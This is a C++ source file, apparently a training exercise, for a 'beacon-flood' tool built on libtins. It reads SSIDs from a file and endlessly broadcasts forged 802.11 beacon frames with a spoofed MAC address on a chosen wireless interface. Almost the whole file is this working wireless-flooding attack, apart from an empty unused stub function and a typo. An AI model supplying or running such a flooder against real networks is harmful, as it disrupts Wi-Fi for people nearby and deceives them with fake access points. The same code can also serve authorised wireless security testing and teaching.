#include <iostream>
#include <fstream>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <tins/tins.h>


using namespace std;
using namespace Tins;

void usage() {
	printf("syntax: beacon-flood <interface> <ssid-list-file> \n");
	printf("sample: beacon-flood wlan0 ssid-list.txt\n");
}

RadioTap packet_beacon(string SSID) {
    
}

int main(int argc, char* argv[]) {
    if (argc != 3){
        usage();
		return -1;
    }
    
    NetworkInterface wlan0 = argv[1];
    PacketSender sender;

    vector<string> SSIDList;
    string strSSID;

    std::ifstream ifs(argv[2]);

    if(ifs.fail()){
        std::cout << "fiail" << std::endl;
        return -1;
    }

    strSSID.resize(255);
    while(ifs.getline(&strSSID[0], 255))
        SSIDList.push_back(strSSID);

    ifs.close();

    RadioTap packet[10];
    while (1) {
        for (int i=0; i< SSIDList.size(); i++) {
        Dot11Beacon beacon;
        beacon.addr1(Dot11::BROADCAST);
        beacon.addr2("c2:11:08:ed:80:00");
        beacon.addr3("c2:11:08:ed:80:00");
        beacon.ssid(SSIDList[i]);
        beacon.ds_parameter_set(8);
        beacon.rsn_information(RSNInformation::wpa2_psk());

        RadioTap packet = RadioTap() / beacon;
        sender.send(packet, wlan0);
        usleep(1);
    }
        
    }
}